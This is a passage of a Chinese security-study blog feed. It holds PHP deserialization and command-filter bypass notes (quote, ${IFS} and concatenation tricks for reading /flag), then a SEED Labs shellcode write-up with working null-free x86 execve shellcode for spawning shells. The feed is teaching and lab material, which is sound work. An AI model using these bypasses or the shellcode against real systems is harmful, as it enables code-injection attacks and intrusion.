class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$number</span> = <span class="hljs-number">34</span>;<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$null</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$number</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$bool</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$null</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;i:34;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;s:6:&quot;</span>uusama<span class="hljs-string">&quot;;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;b:1;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;N;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">30</span>) <span class="hljs-string">&quot;a:2:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;i:1;s:1:&quot;</span>b<span class="hljs-string">&quot;;i:2;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="反序列化">2 反序列化</h1><p>概念：把序列化后的字符串恢复原样</p><p>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用<code>__wakeup()</code>成员函数（如果存在的话）</p><p><code>__wakeup()</code>函数<strong>漏洞原理</strong>：当序列化字符串表示对象属性个数的值<strong>大于</strong>真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p><strong>php的魔术方法</strong></p><ul><li>__construct() 当一个对象创建时被调用 –构造函数</li><li>__destruct() 当一个对象销毁时被调用 –析构函数</li><li>__wakeup() 使用unserialize时触发</li><li>__sleep() 使用serialize时触发</li><li>__toString() 当一个对象被当做一个字符串时来使用</li></ul><p><strong>序列化到反序列化这几个函数的执行过程：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()` -&gt;`<span class="hljs-title function_ invoke__">__sleep</span>()` -&gt; `<span class="hljs-title function_ invoke__">__wakeup</span>()` -&gt; `<span class="hljs-title function_ invoke__">__toString</span>()` -&gt; `<span class="hljs-title function_ invoke__">__destruct</span>()<br></code></pre></td></tr></table></figure><h1 id="call_user_func_array">3 call_user_func_array</h1><p>作用：调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 普通使用：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>) </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>; <br>&#125; <br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出 111 222</span><br><br><span class="hljs-comment"># 调用类内部的方法：</span><br>Class ClassA <br>&#123; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bc</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-variable">$bc</span> = <span class="hljs-variable">$b</span> + <span class="hljs-variable">$c</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$bc</span>; <br>&#125; <br>&#125; <br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ClassA&#x27;</span>,<span class="hljs-string">&#x27;bc&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出  333 </span><br></code></pre></td></tr></table></figure><h1 id="绕过正则过滤">4 绕过正则过滤</h1><ul><li><p>反斜线<code>\</code>绕过</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>l\s<br></code></pre></td></tr></table></figure></li><li><p><code>$&#123;IFS&#125;</code>,<code>$IFS</code>代替空格</p></li><li><p>引号绕过</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">//如<span class="hljs-built_in">cat</span>、<span class="hljs-built_in">ls</span>被过滤<br><span class="hljs-variable">$</span> ca<span class="hljs-string">&quot;&quot;</span>t /flag<br><span class="hljs-variable">$</span> l<span class="hljs-string">&#x27;s&#x27;</span> /<br></code></pre></td></tr></table></figure></li><li><p>拼接法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> a=<span class="hljs-built_in">fl</span>;b=ag;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure></li><li><p>八进制编码和十六进制编码绕过</p><ul><li>比如：<code>/</code>的八进制编码为\57，那么使用<code>$(printf$&#123;IFS&#125;”\57”)</code>内敛执行输出“/”到字符串中。</li></ul></li><li><p>cat的替换命令</p><table><thead><tr class="header"><th>命令</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tac</td><td>与cat相反，按行反向输出</td></tr><tr class="even"><td>more</td><td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td></tr><tr class="odd"><td>less</td><td>与more类似</td></tr><tr class="even"><td>tail</td><td>查看文件末几行</td></tr><tr class="odd"><td>head</td><td>查看文件首几行</td></tr></tbody></table></li><li><p><code>/[oc]:\d+:/i</code>：匹配的是 O:4，我们用 O:+4即可绕过</p></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化- 悠悠i - 博客园 (cnblogs.com)</a></li><li><ahref="https://jiashi19.gitee.io/2023/09/18/ctf-web-php/">ctf-web练习(php)- Blog from js19 (gitee.io)</a></li><li><ahref="https://blog.csdn.net/weihuiblog/article/details/78998924">call_user_func_array函数详解-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode Development</title>
    <link href="/2023/10/17/SEED-LABS/Software%20Security/Shellcode%20Development/"/>
    <url>/2023/10/17/SEED-LABS/Software%20Security/Shellcode%20Development/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1 Overview</h1><p>shellcode广泛用于许多涉及代码注入的攻击中.编写shellcode是相当有挑战性的.虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的.shellcode中涉及到几种有趣的技术.本实验的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode.</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址.第一个挑战不是很难解决，有几种方法可以解决它.第二个挑战的解决方案导致了编写shellcode的两种典型方法.在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址.在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用函数时，其地址被推入堆栈（作为返回地址）.</p><h1 id="task-1-writing-shellcode">2 Task 1: Writing Shellcode</h1><h2 id="task-1.a-the-entire-process">2.1 Task 1.a: The EntireProcess</h2><ol type="1"><li><p>程序生命周期（源自CSAPP）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938146.png"alt="image-20231017191745744" /><figcaption aria-hidden="true">image-20231017191745744</figcaption></figure></li><li><p>大端模式和小端模式.大多数英特尔 CPU都使用小端模式，本实验采用的也是小端模式.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938147.png"alt="image-20231017191842781" /><figcaption aria-hidden="true">image-20231017191842781</figcaption></figure></li><li><p>mysh.s源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li><li><p>使用nasm 编译汇编代码(mysh.s)，通过链接得到可执行文件.注：nasm是用于 Intel x86和 x64架构的汇编和反汇编程序.-felf32选项表明我们希望将代码编译为32位 ELF 二进制格式，-m elfi386选项表示生成 32 位 ELF 二进制文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938148.png"alt="image-20231017191935519" /><figcaption aria-hidden="true">image-20231017191935519</figcaption></figure></li><li><p>通过<code>./mysh</code>运行最终的可执行代码 mysh.执行前后使用echo$$得到当前shell进程的id，从而验证是否成功开启了新的shell.通过下图可以看到执行前后shell进程ID发生了变化.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938149.png"alt="image-20231017192027041" /><figcaption aria-hidden="true">image-20231017192027041</figcaption></figure></li><li><p>利用<code>objdump</code>进行反汇编，从可执行文件或目标文件中提取机器代码（从技术上讲，只有机器代码才称为shellcode，可执行文件中包含实际机器代码以外的数据）.<code>-Mintel</code>表示显示Intel格式的汇编代码，默认为AT&amp;T格式；<code>–-disassemble</code>表示反汇编，可以使用<code>-d</code>代替.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938150.png"alt="image-20231017192108808" /><figcaption aria-hidden="true">image-20231017192108808</figcaption></figure></li><li><p>使用 xxd 命令打印出二进制文件的内容，可以从打印输出的内容中找出shellcode 的机器码,此步骤是为了方便进行复制.-p表示列之间不需要空格，-c20表示一行有20个字符.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938151.png"alt="image-20231017192203497" /><figcaption aria-hidden="true">image-20231017192203497</figcaption></figure></li><li><p>提取出目标序列，先复制到convert.py中，然后运行conver.py得到shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938152.png"alt="image-20231017192221909" /><figcaption aria-hidden="true">image-20231017192221909</figcaption></figure></li></ol><h2 id="task-1.b.-eliminating-zeros-from-the-code">2.2 Task 1.b.Eliminating Zeros from the Code</h2><ol type="1"><li><p>背景：Shellcode广泛应用于缓冲区溢出攻击.在许多情况下，漏洞是由字符串复制引起的，例如strcpy()函数.对于这些字符串复制函数，0x00被认为是字符串的末尾.因此，如果我们的shellcode中有零，字符串复制将不能把零后面的任何内容从这个shellcode复制到目标缓冲区，攻击将不能成功.</p></li><li><p>代码 mysh.s需要在四个不同的地方使用零.请指出所有这些地方，并解释代码如何使用零，但又不在代码中引入零.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171925789.png"alt="image-20231017192537333" /><figcaption aria-hidden="true">image-20231017192537333</figcaption></figure><ul><li>eax置0：相同值逐位异或得到全零</li><li>使用eax（第一步构造得到）作为字符串终止符，而不是直接使用0x00</li><li>edx置0：相同值逐位异或得到全零</li><li>eax=0x0000000b：直接赋值moveax,0x0000000b会出现截止符，所有先使用异或将eax置0，再将0x0b赋值给eax的低8位</li></ul></li><li><p>执行/bin/bash，并且不可以有多余的/.通常，要将此字符串推入堆栈，我们需要让长度为4 的倍数，因此我们要将字符串转换为 /bin////bash.</p><ul><li><p>目标：构造出字符串/bin/bash\0.使用移位操作得到字符串末尾0，避免strcpy失败.注：Push是四个字节对齐的，因此必须每次压栈四个字节或者一个字节一个字节赋值；构造argv[1]前需将eax置0.<strong>将字符串压栈时，连续储存，开头的字符对应低地址，结尾字符对应高地址.</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310240928517.png"alt="image-20231024092759735" /><figcaption aria-hidden="true">image-20231024092759735</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      mov eax, &quot;h###&quot;;eax=23232368<br>      shl eax, 24;左移24位,eax=68000000<br>      shr eax, 24;右移24位,eax=00000068<br>      push eax<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      xor eax, eax; eax=0<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin/bash&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li><li><p>先进行编译链接，然后反汇编查看机器代码，确认没有0x00</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938154.png"alt="image-20231017192810335" /><figcaption aria-hidden="true">image-20231017192810335</figcaption></figure></li><li><p>执行mysh_1b，成功得到一个shell.注：需要以管理员权限运行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938155.png"alt="image-20231017192830367" /><figcaption aria-hidden="true">image-20231017192830367</figcaption></figure></li></ul></li></ol><h2 id="task-1.c.-providing-arguments-for-system-calls">2.3 Task 1.c.Providing Arguments for System Calls</h2><ol type="1"><li><p>目标：使用execve实现以下命令的执行：/bin/sh -c "ls -la"</p></li><li><p>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名.既可以是绝对路径，又可以是相对路径.argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同.envp[]:最后一个参数envp指定了新程序的环境列表.参数envp对应于新程序的environ数组.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938156.png"alt="image-20231017193028508" /><figcaption aria-hidden="true">image-20231017193028508</figcaption></figure></li><li><p>系统调用是通过<code>int 0x80</code>来实现的，对于该函数，寄存器eax放execve的系统调用号11；寄存器ebx放文件路径，即第一个参数；寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要<strong>以空指针(NULL)结束</strong>；寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组.</p></li><li><p>构造参数数组，先将参数压入栈，再从右至左依次将参数指针压入栈.argv[3]=0，作为结尾空指针；argv[2]= "ls -la",使用移位操作构造0；argv[1] ="-c"，同样通过移位操作构造0；argv[0] =points"/bin//sh".最后，依次将参数指针压入栈，把argv[]地址赋值给ecx.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      mov eax, &quot;la##&quot;<br>      shl eax, 16<br>      shr eax, 16 <br>      push eax<br>      push &quot;ls -&quot;; argv[2] = &quot;ls -la&quot;<br>      mov ecx,esp; argv[2] point<br>      <br>      mov eax, &quot;-c##&quot;<br>      shl eax, 16<br>      shr eax, 16<br>      push eax          ; argv[1] = &quot;-c&quot;<br>      mov edx,esp; argv[1] point<br>      <br>      xor eax,eax; <br>      push eax; argv[3] NULL point<br>      push ecx; argv[2] points &quot;ls -la&quot;<br>      push edx; argv[1] points &quot;-c&quot;<br>      push ebx    ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp  ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li><li><p>编译链接，运行可执行文件，成功运行目标命令</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938158.png"alt="image-20231017193236306" /><figcaption aria-hidden="true">image-20231017193236306</figcaption></figure></li></ol><h1 id="task-2-using-code-segment">3 Task 2: Using Code Segment</h1><ol type="1"><li><p>mysh2.s代码总体流程：执行jmp shorttwo语句，跳转到two中执行，two中调用one，再跳转到one中执行.这段汇编代码的主要目的是使用execve系统调用来执行/bin/sh程序.argv[]数组：argv[0]=字符串（shellcode）地址，存储于[ebx+8]位置；argv[1]=NULL指针，存储于[ebx+12]位置.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>BITS 32<br>jmp short two<br>    one:<br>        pop ebx# ebx=字符串(shellcode)地址<br>        xor eax, eax# eax=0<br>        mov [ebx+7], al# [ebx+7]=0  前8字节内容：/bin/sh\0<br>        mov [ebx+8], ebx   # 赋值前：[ebx+8]=AAAA  赋值后：[ebx+8]=字符串(shellcode)地址<br>        mov [ebx+12], eax# 赋值后：[ebx+12]=BBBB 赋值后：[ebx+12]=0<br>        lea ecx, [ebx+8] # ecx=argv[]地址<br>        xor edx, edx# edx=0 即无环境变量<br>        mov al,  0x0b# eax=11（十进制）即系统调用号<br>        int 0x80# 执行系统调用<br>    two:<br>        call one# 调用one函数，将下一条语句地址压入栈，作为ret，再跳转到one中继续执行<br>        db &#x27;/bin/sh*AAAABBBB&#x27; # shellcode<br></code></pre></td></tr></table></figure></li><li><p>目标：执行命令<code>/usr/bin/env -i a=11 b=22</code>.该命令用于清除环境变量并为两个特定变量a 和 b 设置新的值.</p><ul><li><p>代码编写：代码工作主要集中在argv[]的构造，从参数1指针到参数4指针，地址递增，而栈空间是由高地址向低地址增长，符合从右至左依次入栈.其余部分与原代码基本相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>BITS 32<br>jmp short two<br>    one:<br> pop ebx;ebx=address of shellcode<br> xor eax, eax<br><br>        mov [ebx+12], al<br>        mov [ebx+15], al<br>        mov [ebx+20], al<br>        mov [ebx+25], al;Replace the placeholder with zero<br><br>;Construct argv[];Before assignment:[ebx+26]=AAAA<br>        mov [ebx+26],ebx ;After  assignment:[ebx+26]=address of &quot;/usr/bin/env\0&quot;  argv[0]<br>        <br>        lea eax,[ebx+13];Before assignment:[ebx+30]=BBBB<br>        mov [ebx+30],eax ;After  assignment:[ebx+30]=address of &quot;-i\0&quot;argv[1]<br>        <br>        lea eax,[ebx+16];Before assignment:[ebx+34]=CCCC<br>        mov [ebx+34],eax ;After  assignment:[ebx+34]=address of &quot;a=11\0&quot;argv[2]<br>        <br>        lea eax,[ebx+21];Before assignment:[ebx+38]=DDDD<br>        mov [ebx+38],eax ;After  assignment:[ebx+38]=address of &quot;b=22\0&quot;argv[3]<br><br>        xor eax,eax<br>        mov [ebx+42],eax ;argv[4]=NULL point<br>  <br><br>        lea ecx, [ebx+26] ;ecx = address of &quot;/usr/bin/env -i a=11 b=22&quot;<br> xor edx, edx;edx = 0 No environment variables<br> mov al,  0x0b;eax = 0x0bSystem call number<br> int 0x80;Start system call<br>     two:<br> call one<br> db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;<br>      ;0    5    1    5    2    5    3    5    4    5<br></code></pre></td></tr></table></figure></li><li><p>编译链接执行，成功打印环境变量</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938160.png"alt="image-20231017193616472" /><figcaption aria-hidden="true">image-20231017193616472</figcaption></figure></li></ul></li></ol><h1 id="总结">4 总结</h1><h2 id="去除二进制代码中的零">4.1 去除二进制代码中的零</h2><ul><li><p>使用<code>xor eax，eax</code>代替<code>mov eax, 0</code></p></li><li><p>如果我们要存储0x0000099到 eax.我们不能只使用 moveax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零.首先将 eax设置为零，然后为 al 寄存器分配一个1字节的数字0x99</p></li><li><p>使用移位操作，下面操作等价于将xyz\0赋给ebx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li></ul><h2 id="获取命令中使用的数据地址">4.2 获取命令中使用的数据地址</h2><ul><li>动态地在堆栈上构建所有必要的数据结构，因此可以从堆栈指针esp获取数据地址</li><li>数据存储在代码区中，其地址通过函数调用机制获取</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://gls.show/p/a10ed24d/#Task-2-Using-Code-Segment">SEED-lab：ShellcodeDevelopment Lab - 郭佳明的博客 (gls.show)</a></li><li><ahref="https://seanxz401.github.io/2022/12/27/网络攻防-shellcode编写/#Task2">网络攻防-shellcode编写- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://blog.csdn.net/qq_33955922/article/details/53956547">Linux执行新程序：execve() 函数_execve函数-CSDN博客</a></li><li><ahref="https://blog.csdn.net/m0_55368674/article/details/128673160">系统调用功能号与execve函数详解_Razors_的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH04-x86反汇编速成班</title>
    <link href="/2023/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/04x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/"/>
    <url>/2023/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/04x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS攻击代码检测</title>
    <link href="/2023/10/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/XSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    <url>/2023/10/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/XSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="导入模块">1 导入模块</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.svm <span class="hljs-keyword">import</span> SVC<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score, recall_score<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br></code></pre></td></tr></table></figure><h1 id="数据预处理">2 数据预处理</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 